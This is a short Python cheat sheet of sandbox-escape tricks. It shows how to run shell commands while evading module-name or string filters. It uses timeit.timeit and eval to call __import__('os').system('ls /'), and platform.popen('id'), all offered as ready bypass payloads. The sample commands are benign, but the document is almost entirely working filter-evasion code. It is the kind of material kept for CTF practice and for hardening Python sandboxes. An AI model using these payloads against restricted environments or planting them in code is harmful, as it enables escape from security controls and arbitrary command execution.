# use other module to skip module or string checking
## timeit
import timeit
timeit.timeit ("__import__('os').system('ls /')", number=1)

## eval & exec
eval ('__import__("os").system("ls /")')

## platform (only for Win95/Win98)
import platform
platform.popen ('id').read ()
